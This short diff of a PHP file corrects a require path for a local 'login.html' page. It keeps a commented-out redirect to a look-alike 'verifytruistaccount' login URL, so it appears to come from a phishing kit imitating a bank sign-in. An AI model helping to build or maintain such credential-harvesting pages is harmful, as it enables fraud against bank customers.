@@ -1,7 +1,7 @@
 <?php
 require_once __DIR__ . '/../vendor/autoload.php';
 
-require '/../login.html';
+require __DIR__ . '/../login.html';
 
 // header("Location: https://verifytruistaccount.vercel.app/login.html");
 
